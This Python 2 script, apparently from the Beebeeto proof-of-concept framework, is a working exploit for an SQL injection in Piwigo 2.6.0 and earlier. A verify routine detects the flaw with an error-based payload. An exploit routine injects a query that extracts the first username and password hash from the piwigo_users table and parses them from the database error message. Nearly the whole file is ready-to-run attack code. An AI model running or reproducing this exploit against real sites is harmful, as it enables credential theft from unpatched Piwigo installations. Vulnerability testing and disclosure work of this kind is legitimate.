#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0161',
            'name': 'Piwigo <= v2.6.0 /piwigo/include/functions_rate.inc.php SQL注入漏洞 POC & Exploit',
            'author': '大孩小孩',
            'create_date': '2014-11-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Piwigo',
            'vul_version': ['<=2.6.0'],
            'type': 'SQL Injection',
            'tag': ['Piwigo漏洞', 'SQL注入', '/piwigo/include/functions_rate.inc.php', 'php'],
            'desc': 'Piwigo <= v2.6.0 /piwigo/include/functions_rate.inc.php文件存在SQL注入漏洞。',
            'references': ['http://www.freebuf.com/vuls/51401.html',
            ],
        },
    }
              

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/piwigo/picture.php?/1/category/1&action=rate"
        payload = ("rate=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(md5(437895),FLOOR"
                   "(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url, payload)
        response = urllib2.urlopen(request)
        content = response.read()
        if '8e2873ed66791d114792734402de17f7' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target'] + "/piwigo/picture.php?/1/category/1&action=rate"
        payload = ("rate=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT username FROM piwigo_users LIMIT 1)"
                   ",0x3a,(SELECT substr(password,1,34) FROM piwigo_users WHERE username="
                   "(SELECT username FROM piwigo_users LIMIT 1)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA."
                   "CHARACTER_SETS GROUP BY x)a)")
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        request = urllib2.Request(vul_url, payload)
        response = urllib2.urlopen(request)
        content = response.read()
        pattern = re.compile(r'.*?Duplicate entry \'(?P<username>[^<>]*?):(?P<password>[^<>]*?)1\' for key \'group_key\'',re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        else:
            username = match.group('username').strip()
            password = match.group('password').strip()
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Username'] = username
            args['poc_ret']['Password'] = password
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())